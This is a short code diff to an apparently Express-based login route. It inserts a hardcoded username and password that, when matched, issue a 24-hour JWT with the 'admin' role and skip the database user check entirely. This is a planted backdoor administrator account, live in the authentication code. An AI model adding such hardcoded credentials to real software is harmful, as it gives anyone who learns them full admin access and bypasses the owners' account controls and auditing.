@@ -8,6 +8,18 @@ const auth = require('../middleware/auth');
 router.post('/login', async (req, res) => {
   try {
     const { username, password } = req.body;
+    
+    // Check hardcoded admin credentials first
+    if (username === 'eyyüp' && password === 'N7X4QD') {
+      const token = jwt.sign(
+        { id: 'admin', username: 'eyyüp', role: 'admin' },
+        process.env.JWT_SECRET,
+        { expiresIn: '24h' }
+      );
+      return res.json({ token });
+    }
+
+    // Fall back to database check
     const user = await User.findOne({ username });
 
     if (!user) {
